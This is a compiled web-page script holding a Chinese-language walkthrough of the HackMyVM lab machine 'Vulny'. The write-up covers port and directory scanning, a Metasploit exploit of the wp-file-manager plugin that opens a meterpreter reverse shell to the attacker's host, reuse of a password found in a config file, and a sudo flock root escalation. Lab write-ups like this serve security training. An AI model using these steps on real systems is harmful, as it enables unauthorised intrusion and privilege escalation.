"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[16882],{92234:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>d,contentTitle:()=>c,default:()=>p,frontMatter:()=>a,metadata:()=>t,toc:()=>l});const t=JSON.parse('{"id":"HackMyVM/Machines/Vulny/index","title":"Vulny","description":"[Linux VM] [Tested on VirtualBox] created by || sml","source":"@site/docs/HackMyVM/Machines/Vulny/index.md","sourceDirName":"HackMyVM/Machines/Vulny","slug":"/HackMyVM/Machines/Vulny/","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Vulny/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Vulny/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackMyVM_Sidebar","previous":{"title":"VivifyTech","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/VivifyTech/"},"next":{"title":"Webmaster","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Webmaster/"}}');var r=s(74848),i=s(28453);const a={},c="Vulny",d={},l=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"\u63a2\u6d4b web \u670d\u52a1",id:"\u63a2\u6d4b-web-\u670d\u52a1",level:2},{value:"<code>wp-file-manager</code> \u63d2\u4ef6\u6f0f\u6d1e\u5229\u7528",id:"wp-file-manager-\u63d2\u4ef6\u6f0f\u6d1e\u5229\u7528",level:2},{value:"\u654f\u611f\u6570\u636e\u6cc4\u9732",id:"\u654f\u611f\u6570\u636e\u6cc4\u9732",level:2},{value:"\u51ed\u636e\u5229\u7528",id:"\u51ed\u636e\u5229\u7528",level:2},{value:"user pwned",id:"user-pwned",level:2},{value:"\u63d0\u6743\u63a2\u6d4b",id:"\u63d0\u6743\u63a2\u6d4b",level:2},{value:"\u5c1d\u8bd5\u63d0\u6743",id:"\u5c1d\u8bd5\u63d0\u6743",level:2},{value:"root pwned",id:"root-pwned",level:2}];function o(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"vulny",children:"Vulny"})}),"\n",(0,r.jsxs)(n.admonition,{type:"note",children:[(0,r.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || sml"}),(0,r.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2020-10-15"}),(0,r.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 3ced42ca083a191b6b619648344521ae"}),(0,r.jsx)(n.p,{children:"\u2620 Root // 161"}),(0,r.jsx)(n.p,{children:"\ud83d\udc80 User // 160"}),(0,r.jsx)(n.p,{children:"\ud83d\udcddNotes //\nHack and Fun. Tested on Virtualbox."})]}),"\n",(0,r.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u9776\u673a\u542f\u52a8",src:s(75072).A+"",width:"1020",height:"687"})}),"\n",(0,r.jsx)(n.p,{children:"\u9776\u673a IP\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.109\n"})}),"\n",(0,r.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:'Nmap scan report for 192.168.56.109\nHost is up (0.00040s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT      STATE SERVICE VERSION\n80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: Apache2 Ubuntu Default Page: It works\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n33060/tcp open  mysqlx?\n| fingerprint-strings:\n|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:\n|     Invalid message"\n|_    HY000\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\n......\nMAC Address: 08:00:27:64:22:A2 (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.6\nNetwork Distance: 1 hop\n'})}),"\n",(0,r.jsx)(n.h2,{id:"\u63a2\u6d4b-web-\u670d\u52a1",children:"\u63a2\u6d4b web \u670d\u52a1"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500[\u2717]\u2500[randark@randark-Parrot]\u2500[~/tmp/HackMyVM-Vulny]\n\u2514\u2500\u2500\u257c $dirsearch -u http://192.168.56.109/secret/\n\n  _|. _ _  _  _  _ _|_    v0.4.2\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903\n\nOutput File: /usr/lib/python3/dist-packages/dirsearch/reports/192.168.56.109_23-12-23_21-37-10.txt\n\nError Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-12-23_21-37-10.log\n\nTarget: http://192.168.56.109/\n\n[21:37:10] Starting:\n[21:37:10] 403 -  279B  - /.ht_wsr.txt\n[21:37:10] 403 -  279B  - /.htaccess.bak1\n[21:37:10] 403 -  279B  - /.htaccess.orig\n[21:37:10] 403 -  279B  - /.htaccess.save\n[21:37:10] 403 -  279B  - /.htaccessOLD2\n[21:37:10] 403 -  279B  - /.htaccess.sample\n[21:37:10] 403 -  279B  - /.htaccessBAK\n[21:37:10] 403 -  279B  - /.htaccess_sc\n[21:37:10] 403 -  279B  - /.htaccess_extra\n[21:37:10] 403 -  279B  - /.htaccessOLD\n[21:37:10] 403 -  279B  - /.htaccess_orig\n[21:37:10] 403 -  279B  - /.html\n[21:37:10] 403 -  279B  - /.htm\n[21:37:10] 403 -  279B  - /.htpasswd_test\n[21:37:10] 403 -  279B  - /.htpasswds\n[21:37:10] 403 -  279B  - /.httr-oauth\n[21:37:11] 403 -  279B  - /.php\n[21:37:18] 200 -   11KB - /index.html\n[21:37:18] 301 -  321B  - /javascript  ->  http://192.168.56.109/javascript/\n[21:37:21] 301 -  317B  - /secret  ->  http://192.168.56.109/secret/\n[21:37:21] 403 -  279B  - /server-status\n[21:37:21] 403 -  279B  - /server-status/\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e2a\u7279\u6b8a\u76ee\u5f55\uff1a",(0,r.jsx)(n.code,{children:"/secret"})]}),"\n",(0,r.jsx)(n.p,{children:"\u8fdb\u4e00\u6b65\u626b\u63cf"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500[\u2717]\u2500[randark@randark-Parrot]\u2500[~/tmp/HackMyVM-Vulny]\n\u2514\u2500\u2500\u257c $dirsearch -u http://192.168.56.109/secret/\n\n  _|. _ _  _  _  _ _|_    v0.4.2\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903\n\nOutput File: /usr/lib/python3/dist-packages/dirsearch/reports/192.168.56.109/-secret-_23-12-23_21-38-20.txt\n\nError Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-12-23_21-38-20.log\n\nTarget: http://192.168.56.109/secret/\n\n[21:38:20] Starting:\n[21:38:21] 403 -  279B  - /secret/.ht_wsr.txt\n[21:38:21] 403 -  279B  - /secret/.htaccess.bak1\n[21:38:21] 403 -  279B  - /secret/.htaccess.sample\n[21:38:21] 403 -  279B  - /secret/.htaccess_extra\n[21:38:21] 403 -  279B  - /secret/.htaccess_orig\n[21:38:21] 403 -  279B  - /secret/.htaccessBAK\n[21:38:21] 403 -  279B  - /secret/.htaccess.orig\n[21:38:21] 403 -  279B  - /secret/.htaccess.save\n[21:38:21] 403 -  279B  - /secret/.htaccess_sc\n[21:38:21] 403 -  279B  - /secret/.htaccessOLD\n[21:38:21] 403 -  279B  - /secret/.htaccessOLD2\n[21:38:21] 403 -  279B  - /secret/.html\n[21:38:21] 403 -  279B  - /secret/.htm\n[21:38:21] 403 -  279B  - /secret/.htpasswds\n[21:38:21] 403 -  279B  - /secret/.httr-oauth\n[21:38:21] 403 -  279B  - /secret/.htpasswd_test\n[21:38:21] 403 -  279B  - /secret/.php\n[21:38:31] 200 -    7KB - /secret/readme.html\n[21:38:33] 301 -  326B  - /secret/wp-admin  ->  http://192.168.56.109/secret/wp-admin/\n[21:38:33] 301 -  328B  - /secret/wp-content  ->  http://192.168.56.109/secret/wp-content/\n[21:38:33] 200 -    2KB - /secret/wp-content/\n[21:38:33] 500 -  612B  - /secret/wp-content/plugins/akismet/akismet.php\n[21:38:33] 500 -  612B  - /secret/wp-content/plugins/akismet/admin.php\n[21:38:33] 200 - 1005B  - /secret/wp-content/upgrade/\n[21:38:33] 200 -    1KB - /secret/wp-content/uploads/\n[21:38:33] 403 -  279B  - /secret/wp-includes/\n[21:38:33] 301 -  329B  - /secret/wp-includes  ->  http://192.168.56.109/secret/wp-includes/\n[21:38:33] 500 -    0B  - /secret/wp-includes/rss-functions.php\n[21:38:33] 500 -    3KB - /secret/wp-admin/setup-config.php\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u53ef\u4ee5\u5224\u65ad ",(0,r.jsx)(n.code,{children:"/secret"})," \u76ee\u5f55\u4e0b\u4e3a ",(0,r.jsx)(n.code,{children:"wordpress"})," \u670d\u52a1\uff0c\u5e76\u4e14\u5c1d\u8bd5\u8bbf\u95ee\u7684\u65f6\u5019\u53d1\u751f\u65e0\u6cd5\u89e3\u6790\u7684\u95ee\u9898"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"wordpress \u65e0\u6cd5\u8bbf\u95ee",src:s(72492).A+"",width:"1057",height:"528"})}),"\n",(0,r.jsxs)(n.p,{children:["\u6478\u7d22\u8fc7\u7a0b\u4e2d\uff0c\u53d1\u73b0 ",(0,r.jsx)(n.code,{children:"/secret/wp-content"})," \u53ef\u4ee5\u8bbf\u95ee"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"/secret/wp-content",src:s(93907).A+"",width:"1057",height:"528"})}),"\n",(0,r.jsxs)(n.p,{children:["\u6478\u7d22\u8fc7\u7a0b\u4e2d\uff0c\u53d1\u73b0\u5b58\u5728 ",(0,r.jsx)(n.code,{children:"wp-file-manager"})," \u63d2\u4ef6"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"http://192.168.56.109/secret/wp-content/plugins/",src:s(8325).A+"",width:"1055",height:"527"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5e76\u4e14\u5728\u4e0a\u4f20\u76ee\u5f55 ",(0,r.jsx)(n.code,{children:"http://192.168.56.109/secret/wp-content/uploads/2020/10/"})," \u4e2d\uff0c\u53d1\u73b0 ",(0,r.jsx)(n.code,{children:"wp-file-manager"})," \u7684\u90e8\u7f72\u5305\uff0c\u8fdb\u800c\u53ef\u4ee5\u786e\u5b9a\u7248\u672c"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"http://192.168.56.109/secret/wp-content/uploads/2020/10/",src:s(75534).A+"",width:"1057",height:"528"})}),"\n",(0,r.jsxs)(n.p,{children:["\u901a\u8fc7\u68c0\u7d22\u6f0f\u6d1e\u5229\u7528\u5e93\uff0c\u53ef\u4ee5\u786e\u5b9a\u8fd9\u4e2a\u7248\u672c\u7684 ",(0,r.jsx)(n.code,{children:"wp-file-manager"})," \u63d2\u4ef6\u5b58\u5728 RCE \u6f0f\u6d1e"]}),"\n",(0,r.jsxs)(n.h2,{id:"wp-file-manager-\u63d2\u4ef6\u6f0f\u6d1e\u5229\u7528",children:[(0,r.jsx)(n.code,{children:"wp-file-manager"})," \u63d2\u4ef6\u6f0f\u6d1e\u5229\u7528"]}),"\n",(0,r.jsx)(n.p,{children:"\u76f4\u63a5\u4f7f\u7528 msfconsole \u4e00\u628a\u68ad"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'[msf](Jobs:0 Agents:0) exploit(multi/http/wp_file_manager_rce) >> set ForceExploit true\nForceExploit => true\n[msf](Jobs:0 Agents:0) exploit(multi/http/wp_file_manager_rce) >> show options\n\nModule options (exploit/multi/http/wp_file_manager_rce):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   COMMAND    upload           yes       elFinder commands used to exploit the vulnerability (Accepted: upload, mkfile+put)\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS     192.168.56.109   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-met\n                                         asploit.html\n   RPORT      80               yes       The target port (TCP)\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\n   TARGETURI  /secret/         yes       Base path to WordPress installation\n   VHOST                       no        HTTP server virtual host\n\n\nPayload options (php/meterpreter/reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  192.168.56.102   yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   WordPress File Manager 6.0-6.8\n\n\n\nView the full module info with the info, or info -d command.\n\n[msf](Jobs:0 Agents:0) exploit(multi/http/wp_file_manager_rce) >> exploit\n\n[*] Started reverse TCP handler on 192.168.56.102:4444\n[*] Running automatic check ("set AutoCheck false" to disable)\n[!] Cannot reliably check exploitability. ForceExploit is enabled, proceeding with exploitation.\n[*] 192.168.56.109:80 - Payload is at /secret/wp-content/plugins/wp-file-manager/lib/files/XGMhyw.php\n[*] Sending stage (39927 bytes) to 192.168.56.109\n[+] Deleted XGMhyw.php\n[*] Meterpreter session 1 opened (192.168.56.102:4444 -> 192.168.56.109:57478) at 2023-12-23 21:56:17 +0800\n'})}),"\n",(0,r.jsx)(n.h2,{id:"\u654f\u611f\u6570\u636e\u6cc4\u9732",children:"\u654f\u611f\u6570\u636e\u6cc4\u9732"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",metastring:'title="/etc/wordpress/config-192.168.1.122.php"',children:"<?php\ndefine('DB_NAME', 'wordpress');\ndefine('DB_USER', 'wordpress');\ndefine('DB_PASSWORD', 'myfuckingpassword');\ndefine('DB_HOST', 'localhost');\ndefine('DB_COLLATE', 'utf8_general_ci');\ndefine('WP_CONTENT_DIR', '/usr/share/wordpress/wp-content');\n?>\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",metastring:'title="/usr/share/wordpress/wp-config.php"',children:"<?php\n/***\n * WordPress's Debianised default master config file\n * Please do NOT edit and learn how the configuration works in\n * /usr/share/doc/wordpress/README.Debian\n ***/\n\n/* Look up a host-specific config file in\n * /etc/wordpress/config-<host>.php or /etc/wordpress/config-<domain>.php\n */\n$debian_server = preg_replace('/:.*/', \"\", $_SERVER['HTTP_HOST']);\n$debian_server = preg_replace(\"/[^a-zA-Z0-9.\\-]/\", \"\", $debian_server);\n$debian_file = '/etc/wordpress/config-'.strtolower($debian_server).'.php';\n/* Main site in case of multisite with subdomains */\n$debian_main_server = preg_replace(\"/^[^.]*\\./\", \"\", $debian_server);\n$debian_main_file = '/etc/wordpress/config-'.strtolower($debian_main_server).'.php';\n\nif (file_exists($debian_file)) {\n    require_once($debian_file);\n    define('DEBIAN_FILE', $debian_file);\n} elseif (file_exists($debian_main_file)) {\n    require_once($debian_main_file);\n    define('DEBIAN_FILE', $debian_main_file);\n} elseif (file_exists(\"/etc/wordpress/config-default.php\")) {\n    require_once(\"/etc/wordpress/config-default.php\");\n    define('DEBIAN_FILE', \"/etc/wordpress/config-default.php\");\n} else {\n    header(\"HTTP/1.0 404 Not Found\");\n    echo \"Neither <b>$debian_file</b> nor <b>$debian_main_file</b> could be found. <br/> Ensure one of them exists, is readable by the webserver and contains the right password/username.\";\n    exit(1);\n}\n\n/* idrinksomewater */\n\n/* Default value for some constants if they have not yet been set\n   by the host-specific config files */\nif (!defined('ABSPATH'))\n    define('ABSPATH', '/usr/share/wordpress/');\nif (!defined('WP_CORE_UPDATE'))\n    define('WP_CORE_UPDATE', false);\nif (!defined('WP_ALLOW_MULTISITE'))\n    define('WP_ALLOW_MULTISITE', true);\nif (!defined('DB_NAME'))\n    define('DB_NAME', 'wordpress');\nif (!defined('DB_USER'))\n    define('DB_USER', 'wordpress');\nif (!defined('DB_HOST'))\n    define('DB_HOST', 'localhost');\nif (!defined('WP_CONTENT_DIR') && !defined('DONT_SET_WP_CONTENT_DIR'))\n    define('WP_CONTENT_DIR', '/var/lib/wordpress/wp-content');\n\n/* Default value for the table_prefix variable so that it doesn't need to\n   be put in every host-specific config file */\nif (!isset($table_prefix)) {\n    $table_prefix = 'wp_';\n}\n\nif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')\n    $_SERVER['HTTPS'] = 'on';\n\nrequire_once(ABSPATH . 'wp-settings.php');\n?>\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5728 ",(0,r.jsx)(n.code,{children:"/etc/wordpress/config-192.168.1.122.php"})," \u6587\u4ef6\u4e2d\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a\u5947\u602a\u7684\u6ce8\u91ca"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"idrinksomewater\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u7ed3\u5408 ",(0,r.jsx)(n.code,{children:"/etc/passwd"})," \u7684\u6587\u4ef6\u5185\u5bb9\uff0c\u6000\u7591\u662f\u7528\u6237\u51ed\u636e"]}),"\n",(0,r.jsx)(n.h2,{id:"\u51ed\u636e\u5229\u7528",children:"\u51ed\u636e\u5229\u7528"}),"\n",(0,r.jsx)(n.p,{children:"\u51ed\u636e\u4e3a\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"adrian:idrinksomewater\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@vulny:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$ su adrian\nPassword:\nadrian@vulny:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$ whoami\nadrian\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u6210\u529f\u5207\u6362\u5230 ",(0,r.jsx)(n.code,{children:"adrian"})," \u7528\u6237"]}),"\n",(0,r.jsx)(n.h2,{id:"user-pwned",children:"user pwned"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"adrian@vulny:~$ cat user.txt\nHMViuploadfiles\n"})}),"\n",(0,r.jsx)(n.h2,{id:"\u63d0\u6743\u63a2\u6d4b",children:"\u63d0\u6743\u63a2\u6d4b"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"Matching Defaults entries for adrian on vulny:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser adrian may run the following commands on vulny:\n    (ALL : ALL) NOPASSWD: /usr/bin/flock\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="find / -perm -u=s -type f 2>/dev/null"',children:"/usr/bin/chsh\n/usr/bin/mount\n/usr/bin/sudo\n/usr/bin/gpasswd\n/usr/bin/pkexec\n/usr/bin/at\n/usr/bin/passwd\n/usr/bin/su\n/usr/bin/umount\n/usr/bin/fusermount\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/snapd/snap-confine\n/usr/lib/openssh/ssh-keysign\n/snap/core18/1880/bin/mount\n/snap/core18/1880/bin/ping\n/snap/core18/1880/bin/su\n/snap/core18/1880/bin/umount\n/snap/core18/1880/usr/bin/chfn\n/snap/core18/1880/usr/bin/chsh\n/snap/core18/1880/usr/bin/gpasswd\n/snap/core18/1880/usr/bin/newgrp\n/snap/core18/1880/usr/bin/passwd\n/snap/core18/1880/usr/bin/sudo\n/snap/core18/1880/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core18/1880/usr/lib/openssh/ssh-keysign\n/snap/snapd/8542/usr/lib/snapd/snap-confine\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="getcap -r / 2>/dev/null"',children:"/usr/bin/traceroute6.iputils = cap_net_raw+ep\n/usr/bin/ping = cap_net_raw+ep\n/usr/bin/mtr-packet = cap_net_raw+ep\n/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u53d1\u73b0 ",(0,r.jsx)(n.code,{children:"/usr/bin/flock"})," \u53ef\u4ee5\u5b9e\u73b0\u65e0\u5bc6\u7801\u6267\u884c sudo"]}),"\n",(0,r.jsx)(n.h2,{id:"\u5c1d\u8bd5\u63d0\u6743",children:"\u5c1d\u8bd5\u63d0\u6743"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"adrian@vulny:~$ sudo flock -u / /bin/bash\nroot@vulny:/home/adrian# whoami\nroot\n"})}),"\n",(0,r.jsx)(n.h2,{id:"root-pwned",children:"root pwned"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"root@vulny:~# cat root.txt\nHMVididit\n"})})]})}function p(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(o,{...e})}):o(e)}},75072:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/image_20231231-213109-45ceb5f1a478c42c998d69266586220e.png"},72492:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/image_20231247-214729-2a94cf3697d51ae3b1c122f617a382a9.png"},93907:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/image_20231248-214811-5f699c3393e8e186daa4d8f287b1e281.png"},8325:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/image_20231248-214844-9e436f82766b36bf2192f7fcea35a33e.png"},75534:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/image_20231253-215318-a6762b029bef61adc35f4c03cbd45668.png"},28453:(e,n,s)=>{s.d(n,{R:()=>a,x:()=>c});var t=s(96540);const r={},i=t.createContext(r);function a(e){const n=t.useContext(i);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:a(e.components),t.createElement(i.Provider,{value:n},e.children)}}}]);